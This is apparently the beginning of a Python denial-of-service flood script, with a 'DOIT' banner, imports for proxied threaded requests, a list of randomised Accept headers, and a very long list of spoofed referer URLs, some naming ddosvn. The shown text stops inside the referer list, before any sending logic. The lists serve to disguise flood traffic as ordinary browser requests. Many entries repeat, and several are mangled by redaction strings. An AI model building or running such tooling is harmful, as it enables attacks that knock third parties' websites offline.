import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime

print ('''
██████╗░░█████╗░██╗████████╗
██╔══██╗██╔══██╗██║╚══██╔══╝
██║░░██║██║░░██║██║░░░██║░░░
██║░░██║██║░░██║██║░░░██║░░░
██████╔╝╚█████╔╝██║░░░██║░░░
╚═════╝░░╚════╝░╚═╝░░░╚═╝░░░''')

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [

'https://eu1.proxysite.com/process.php?d=',
     'https://eu2.proxysite.com/process.php?d=',
     'https://eu3.proxysite.com/process.php?d=',
     'https://eu4.proxysite.com/process.php?d=',
     'https://eu5.proxysite.com/process.php?d=',
     'https://eu6.proxysite.com/process.php?d=',
     'https://eu7.proxysite.com/process.php?d=',
     'https://eu8.proxysite.com/process.php?d=',
     'https://eu9.proxysite.com/process.php?d=',
     'https://eu10.proxysite.com/process.php?d=',
     'https://us1.proxysite.com/process.php?d=',
     'https://us2.proxysite.com/process.php?d=',
     'https://us3.proxysite.com/process.php?d=',
     'https://us4.proxysite.com/process.php?d=',
     'https://us5.proxysite.com/process.php?d=',
     'https://us6.proxysite.com/process.php?d=',
     'https://us7.proxysite.com/process.php?d=',
     'https://us8.proxysite.com/process.php?d=',
     'https://us9.proxysite.com/process.php?d=',
     'https://us10.proxysite.com/process.php?d=',
     'https://us11.proxysite.com/process.php?d=',
     'https://us12.proxysite.com/process.php?d=',
     'https://us13.proxysite.com/process.php?d=',
     'https://us14.proxysite.com/process.php?d=',
     'https://us15.proxysite.com/process.php?d=',
     'https://divine.graphics/proxy.php?',
     'https://www.localizaip.com.br/localizar-ip.php?ip=',
     'http://www.meuenderecoip.com/localizar-ip.php?ip=',
     'https://website-down.com/',
     'http://proxy.clgt.net/proxy.php/',
     'https://www.pinterest.com/pin/create/button/?url=',
     'https://www.reddit.com/login/?dest=',
     'https://www.reddit.com/submit?url=',
     'https://www.filterbypass.me/s.php?k=',
     'https://www.filterbypass.me/?url=',
     'https://quantrimang.com/url?q=',
     'https://learnsql.xyz/chuyen-huong/?url=',
     'https://user.gtarcade.com/site/login?rurl=',
     'http://e9geolgzk6.com/iuqasfg3?dbqfdh=34&refer=',
     'https://iplookup.flagfox.net/?host=',
     'https://foradoar.org/',
     'https://duckduckgo.com/',
     'https://www.google.com/',
     'https://www.youtube.com',
     'http://www.google.com/?q=',
     'https://www.responsinator.com/?url=',
     'https://king.host/wiki/?url=',
     'https://website.grader.com/results/',
     'https://sitecheck.sucuri.net/results/',
     'https://www.ssllabs.com/ssltest/analyze.html?d=',
     'https://transparencyreport.google.com/safe-browsing/search?url=',
     'https://www.webpagetest.org/?url=',
     'https://www.hostinger.com.br/tutoriais/?url=',
     'https://www.sslshopper.com/ssl-checker.html#hostname=',
     'https://safeweb.norton.com/report/show?url=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://validator.w3.org/check?uri=',
     'http://www.facebook.com/sharer/sharer.php?u=',
     'http://downforeveryoneorjustme.com/',
     'http://network-tools.com/default.asp?prog=ping&host=',
     'http://network-tools.com/default.asp?prog=trace&host=',
     'http://network-tools.com/default.asp?prog=network&host=',
     'https://domainr.com/?q=',
     'https://down.is/',
     'http://whois.domaintools.com/',
     'https://downforeveryoneorjustme.com/',
     'https://www.webhostinghero.com/#',
     'https://www.whoishostingthis.com/#search=',
     'https://ping.eu/port-chk/?url=',
     'https://www.host-tracker.com/?url=',
     'http://hostchecker.net/?url=',
     'https://hostingchecker.com/?url=',
     'https://www.virustotal.com/vi/?url=',
     'http://tainhachay.mobi/?url=',
     'http://trangtainhac.info/?url=',
     'http://www.phimmoi.net/?url=',
     'https://website.informer.com/',
     'https://tainhacvemay.net/?url=',
     'https://nhacvietnam.mobi/?url=',
     'https://waptainhac.net/?url=',
     'https://trangtainhac.net/?url=',
     'https://trangtainhac.com/?url=',
     'https://yamcode.com/?url=',
     'http://network-tools.com/default.asp?prog=ping&host=',
     'http://network-tools.com/default.asp?prog=trace&host=',
     'http://network-tools.com/default.asp?prog=network&host=',
     'http://waptaiaz.com/tai-nhac-mp3/web/artist/list/quality=1&ver=w/?url=',
     'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
     'http://www.google.com/?q=',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'https://developers.google.com/speed/pagespeed/insights/?url=',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://play.google.com/store/search?q=',
     'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://vk.com/profile.php?redirect=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://v1.push-time.com/notifications/pub2/cpm/3/infinity/index.html?p1=',
     'https://browsergames2018.com/bestgames/custom/anime/oven/hentai/index.php?country_code=VN&p1=',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://www.yandex.com/yandsearch?text=',
     'https://duckduckgo.com/?q=',
     'http://www.ask.com/web?q=',
     'http://search.aol.com/aol/search?q=',
     'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://host-tracker.com/check_page/?furl=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'https://jigsaw.w3.org/css-validator/validator?uri=',
     'https://add.my.yahoo.com/rss?url=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://www.google.com/?q=',
     'http://www.google.com/?q=',
     'http://www.google.com/?q=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://coccoc.com/search#query=',
     'http://www.search.com/search?q=',
     'http://www.google.com/?q=',
     'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://vk.com/profile.php?redirect=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://www.yandex.com/yandsearch?text=',
     'https://duckduckgo.com/?q=',
     'http://www.ask.com/web?q=',
     'http://search.aol.com/aol/search?q=',
     'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'https://www.facebook.com/search/results/?init=quick&q=',
     'http://blekko.com/#ws/?q=',
     'http://www.infomine.com/search/?q=',
     'https://twitter.com/search?q=',
     'http://www.wolframalpha.com/input/?i=',
     'http://host-tracker.com/check_page/?furl=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://www.google.com/translate?u=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.onlinewebcheck.com/?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.pagescoring.com/website-speed-test/?url=',
     'http://check-host.net/check-http?host=',
     'http://checksite.us/?url=',
     'http://jobs.bloomberg.com/search?q=',
     'http://www.bing.com/search?q=',
     'https://www.yandex.com/yandsearch?text=',
     'http://www.google.com/?q=',
     'https://add.my.yahoo.com/rss?url=',
     'http://www.bestbuytheater.com/events/search?q=',
     'http://www.shodanhq.com/search?q=',
     'https://play.google.com/store/search?q=',
     'http://coccoc.com/search#query=',
     'https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=',
     'http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://content-available-to-author-only.com/profile.php?redirect=',
     'http://w...content-available-to-author-only...y.com/search/results?q=',
     'http://y...content-available-to-author-only...x.ru/yandsearch?text=',
     'http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=',
     'http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..',
     'http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..',
     'http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..',
     'http://h...content-available-to-author-only...u.com/searchResult?keywords=',
     'http://w...content-available-to-author-only...g.com/search?q=',
     'https://w...content-available-to-author-only...x.com/yandsearch?text=',
     'https://d...content-available-to-author-only...o.com/?q=',
     'http://w...content-available-to-author-only...k.com/web?q=',
     'http://s...content-available-to-author-only...l.com/aol/search?q=',
     'https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'http://v...content-available-to-author-only...3.org/feed/check.cgi?url=',
     'http://h...content-available-to-author-only...r.com/check_page/?furl=',
     'http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=',
     'http://j...content-available-to-author-only...3.org/css-validator/validator?uri=',
     'https://a...content-available-to-author-only...o.com/rss?url=',
     'http://e...content-available-to-author-only...l.com/search?q=',
     'https://s...content-available-to-author-only...y.com/market/search?q=',
     'http://f...content-available-to-author-only...o.com/search?q=',
     'http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=',
     'http://e...content-available-to-author-only...e.net/wow/en/search?q=',
     'http://e...content-available-to-author-only...l.com/search?q=',
     'http://c...content-available-to-author-only...n.org/search?q=',
     'http://t...content-available-to-author-only...t.edu/search?q=',
     'http://w...content-available-to-author-only...m.tv/search?q=',
     'http://w...content-available-to-author-only...d.com/search?q=',
     'http://f...content-available-to-author-only...a.com/search?q=',
     'http://i...content-available-to-author-only...h.io/search?q=',
     'http://j...content-available-to-author-only...s.com/jobs/search?q=',
     'http://t...content-available-to-author-only...p.org/search?q=',
     'http://w...content-available-to-author-only...m.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://w...content-available-to-author-only...s.gov/@@tceq-search?q=',
     'http://w...content-available-to-author-only...t.com/search?q=',
     'http://w...content-available-to-author-only...r.com/events/search?q=',
     'https://c...content-available-to-author-only...e.org/search?q=',
     'http://j...content-available-to-author-only...s.com/search?q=',
     'http://j...content-available-to-author-only...g.com/search?q=',
     'https://w...content-available-to-author-only...t.com/search/?q=',
     'http://m...content-available-to-author-only...r.org/search?q=',
     'https://w...content-available-to-author-only...s.com/search?q=',
     'http://w...content-available-to-author-only...s.uk/search?q=',
     'http://w...content-available-to-author-only...q.com/search?q=',
     'http://www.search.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=',
     'https://www.facebook.com/l.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'http://downforeveryoneorjustme.com/',
     'http://www.slickvpn.com/go-dark/browse.php?u=',
     'https://www.megaproxy.com/go/_mp_framed?',
     'http://scanurl.net/?u=',
     'http://www.isup.me/',
     'http://check-host.net/check-tcp?host=',
     'http://check-host.net/check-dns?host=',
     'http://check-host.net/check-ping?host=',
     'http://www.currentlydown.com/',
     'http://check-host.net/ip-info?host=',
     'https://safeweb.norton.com/report/show?url=',
     'http://www.webproxy.net/view?q=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'https://anonysurfer.com/a2/index.php?q=',
     'http://analiz.web.tr/en/www/',
     'https://plus.google.com/share?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://ddosvn.somee.com/f5.php?v=',
     'http://louis-ddosvn.rhcloud.com/f5.html?v=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://graph.facebook.com/fql?q=SELECT%20like_count,%20total_count,%20share_count,%20click_count,%20comment_count%20FROM%20link_stat%20WHERE%20url%20=%20%22',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://vk.com/profile.php?redirect=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
